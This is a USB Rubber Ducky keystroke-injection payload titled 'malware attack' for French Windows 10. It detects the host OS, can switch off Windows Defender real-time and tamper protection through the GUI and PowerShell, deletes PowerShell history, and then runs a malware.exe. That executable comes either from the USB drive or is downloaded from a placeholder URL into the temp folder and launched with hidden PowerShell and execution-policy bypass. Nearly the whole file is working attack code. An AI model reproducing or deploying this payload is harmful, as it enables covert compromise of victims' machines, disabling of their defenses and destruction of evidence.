REM Title: malware attack
REM Author: ZarKyo
REM Description: Download malware and execute it - OS detection - Optionnal disable windows defender
REM Target: Windows 10 - French
REM Credit : https://github.com/hak5/usbrubberducky-payloads/blob/master/payloads/library/execution/Disable_Windows_Defender22H2/Disable_Windows_Defender.txt

REM Set attackmode
REM value : 1 - HID - download malware with url
REM value : 2 - HID STORAGE - use malware inside of the usb key
DEFINE MODE 2

REM Disable Real Time Protection (GUI)
DEFINE DISABLE_WINDOWS_DEFENDER FALSE

REM Disable Tampering Protection 
DEFINE T_PROTECTION FALSE

REM Attack Commands for disabling RTP and Defender with (T)/without(F) clearing or (R) Restore (Powershell)
REM Need : Tampering Protection disable
DEFINE ATTACK_F Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force; exit;
DEFINE ATTACK_T Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force; Remove-Item (Get-PSReadlineOption).HistorySavePath; exit;

REM CLEAN = TRUE deletes PS History, set to FALSE to run Payload without deleting History
VAR $clean = TRUE

EXTENSION OS_DETECTION
    REM VERSION 1.0

    REM USB Rubber Ducky Host OS Detection
    REM Generic OS detection at a high view is a moving target
    REM results may vary greatly depending 
    REM on a combination of many variables:
    REM  - number of testing stages
    REM  - specific devices and versions tested against
    REM  - number of systems testing for (scope)
    REM  - detection techniques (passive/invisible/active/hybrid)
    REM  - overall speed
    REM  - overall accuracy

    REM TARGET:
    REM DEFAULT - Windows, Mac, Linux
    REM ADVANCED_DETECTION - Windows, Mac, Linux, iOS, ChromeOS, Android

    REM USAGE:
    REM Uncomment the function call below to run this extension inline (here)
    REM or call DETECT_OS() anywhere in your payload after the extension
    REM Place this extension and the DETECT_OS() before
    REM you would like to first reference $_OS to execute payload code conditionally

    REM CONFIGURATION:
    DEFINE VERBOSE FALSE
    DEFINE ADVANCED_DETECTION FALSE
    DEFINE STARTUP_DELAY 1500
    DEFINE RESTART_WAIT 1000
    DEFINE CONNECT_WAIT 1000
    DEFINE OS_DETECT_MODE HID
    DEFINE OS_DETECT_VID VID_05AC
    DEFINE OS_DETECT_PID PID_021E
    DEFINE WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE HOST_RESPONSE_TIMEOUT 1000

    FUNCTION DETECT_OS()
        $_HOST_CONFIGURATION_REQUEST_COUNT = 0
        ATTACKMODE OS_DETECT_MODE OS_DETECT_VID OS_DETECT_PID
        DELAY STARTUP_DELAY
        SAVE_HOST_KEYBOARD_LOCK_STATE

        IF VERBOSE THEN
            IF ADVANCED_DETECTION THEN
                STRING ADVANCED OS DETECT
            ELSE 
                STRING OS DETECT
            END_IF

            ENTER
            STRING test caps
        END_IF

        IF ($_CAPSLOCK_ON == FALSE) THEN
            LED_R
            CAPSLOCK
            DELAY HOST_RESPONSE_TIMEOUT
        END_IF
        LED_OFF

        IF VERBOSE THEN
            ENTER
            STRING test done
        END_IF

        IF $_RECEIVED_HOST_LOCK_LED_REPLY THEN
            IF VERBOSE THEN
                ENTER
                STRING received led response
            END_IF
            LED_G
            IF ($_HOST_CONFIGURATION_REQUEST_COUNT > WINDOWS_HOST_REQUEST_COUNT) THEN
                IF VERBOSE THEN
                    ENTER
                    STRING prediction: Windows
                END_IF
                $_OS = WINDOWS
            ELSE
                IF VERBOSE THEN
                    ENTER
                    STRING prediction: Linux
                END_IF
                $_OS = LINUX
            END_IF
        ELSE
            IF VERBOSE THEN
                ENTER
                STRING no led response
                ENTER
                STRING prediciton: MacOS
            END_IF
            $_OS = MACOS
        END_IF

        IF ADVANCED_DETECTION THEN
            IF ( $_OS == LINUX ) THEN
                IF VERBOSE THEN
                    ENTER
                    STRING soft reconnect
                END_IF
                ATTACKMODE OFF
                DELAY RESTART_WAIT
                ATTACKMODE OS_DETECT_MODE OS_DETECT_VID OS_DETECT_PID
                DELAY CONNECT_WAIT
                IF VERBOSE THEN
                    ENTER
                    STRING reconnected
                END_IF
                IF ($_CAPSLOCK_ON == TRUE) THEN
                    IF VERBOSE THEN
                        ENTER
                        STRING caps led on
                        ENTER
                        STRING test numlock
                    END_IF
                    NUMLOCK
                    DELAY HOST_RESPONSE_TIMEOUT
                    IF VERBOSE THEN
                        ENTER
                        STRING test done
                    END_IF
                    IF ($_NUMLOCK_ON == FALSE) THEN
                        IF VERBOSE THEN
                            ENTER
                            STRING no numlock led
                            ENTER
                            STRING prediciton: ChromeOS
                        END_IF
                        $_OS = CHROMEOS
                    ELSE
                        IF VERBOSE THEN
                            ENTER
                            STRING numlock led on
                            ENTER
                            STRING testing scrolllock
                        END_IF
                        SCROLLLOCK
                        DELAY HOST_RESPONSE_TIMEOUT
                        IF VERBOSE THEN
                            ENTER
                            STRING test done
                        END_IF
                        IF ($_SCROLLLOCK_ON == TRUE) THEN
                            IF VERBOSE THEN
                                ENTER
                                STRING scrolllock led on
                                ENTER
                                STRING prediciton: Android
                            END_IF
                            $_OS = ANDROID
                        ELSE
                            IF VERBOSE THEN
                                ENTER
                                STRING no scrolllock reply
                                ENTER
                                STRING prediction: Linux
                            END_IF
                            $_OS = LINUX
                        END_IF
                    END_IF
                END_IF
            ELSE IF ($_OS == MACOS) THEN
                IF ($_CAPSLOCK_ON == TRUE) THEN
                    IF VERBOSE THEN
                        ENTER
                        STRING caps led on
                        ENTER
                        STRING prediction: iOS
                    END_IF
                    $_OS = IOS
                ELSE 
                    IF VERBOSE THEN
                        ENTER
                        STRING no caps reply
                        ENTER
                        STRING prediction: MacOS
                    END_IF
                    $_OS = MACOS
                END_IF
            ELSE IF ($_OS == WINDOWS) THEN
                IF VERBOSE THEN
                    ENTER
                    STRING Confident Windows Prediction
                END_IF
                $_OS = WINDOWS
            END_IF
        END_IF

        RESTORE_HOST_KEYBOARD_LOCK_STATE

        IF VERBOSE THEN
            ENTER
            STRING OS_DETECT complete
            ENTER
        END_IF
    END_FUNCTION
END_EXTENSION

REM Set attack mode
FUNCTION SET_ATTACKMODE()
    IF (MODE == 1) THEN
        ATTACKMODE HID
    ELSE IF (MODE == 2) THEN
        ATTACKMODE HID STORAGE
    END_IF
END_FUNCTION

FUNCTION OPEN_WINDOWS_DEFENDER_MENU()
    GUI r
    DELAY 200
    STRING windowsdefender:
    ENTER
    DELAY 500
    ENTER
    DELAY 500
    TAB
    TAB
    TAB
    TAB
    ENTER
    DELAY 500
END_FUNCTION

REM Disable Windows Defender RTP GUI
FUNCTION DISABLE_WD()
    OPEN_WINDOWS_DEFENDER_MENU()
    SPACE
    DELAY 500
    ALT o
    DELAY 500
    IF T_PROTECTION == FALSE THEN
        ALT F4
    END_IF
END_FUNCTION

FUNCTION DISABLE_TP()
    IF DISABLE_WINDOWS_DEFENDER == FALSE THEN
        OPEN_WINDOWS_DEFENDER_MENU()
    END_IF
    TAB
    TAB
    TAB
    TAB
    SPACE
    IF DISABLE_WINDOWS_DEFENDER == FALSE THEN
        DELAY 500
        ALT o
    END_IF
    ALT F4
    DELAY 500
    GUI x
    DELAY 100
    STRING a
    DELAY 500
    ALT o
    DELAY 500
    IF ($clean == TRUE) THEN
     STRINGLN ATTACK_T
    ELSE 
     STRINGLN ATTACK_F
    END_IF

END_FUNCTION

REM Disable RTP and TP
FUNCTION DISABLE_PROTECTIONS()
    OPEN_WINDOWS_DEFENDER_MENU()
    DISABLE_WD()
    DELAY 500
    DISABLE_TP()
END_FUNCTION

REM Run .exe from USB drive.
REM VOLUME name : "DUCKY"
REM ATTACKMODE HID STORAGE
FUNCTION RUN_INTERNAL()
    DELAY 500
    $_STORAGE_ACTIVITY_TIMEOUT = 10000
    WAIT_FOR_STORAGE_ACTIVITY
    GUI r
    DELAY 300
    STRING powershell -NoP -w h -Exec Bypass "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter + ':'";powershell -NoP -NonI -w h -Exec Bypass .$m\malware.exe
    ENTER
END_FUNCTION

REM Run .exe from external ressource
FUNCTION RUN_EXTERNAL()
    DELAY 500
    GUI r
    DELAY 200
    STRINGLN powershell -NoP -NonI -w h
    DELAY 500
    STRING powershell -NoP -NonI -w h -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http://example.com/downloads/malware.exe','$env:temp\malware.exe')";powershell -NoP -NonI -w h -Exec Bypass .$env:temp\malware.exe
    ENTER
END_FUNCTION

REM Run the script
DETECT_OS()
SET_ATTACKMODE()

IF ($_OS == WINDOWS) THEN
    IF ((DISABLE_WINDOWS_DEFENDER) && (T_PROTECTION)) THEN
        DISABLE_PROTECTIONS()
    ELSE IF DISABLE_WINDOWS_DEFENDER THEN
        DISABLE_WD()
    ELSE IF T_PROTECTION THEN
        DISABLE_TP()
    END_IF

    IF ($_CURRENT_ATTACKMODE == 1) THEN
        RUN_EXTERNAL()
    ELSE IF ($_CURRENT_ATTACKMODE == 3) THEN
        RUN_INTERNAL()
    END_IF
END_IF

REM need to complete for Linux system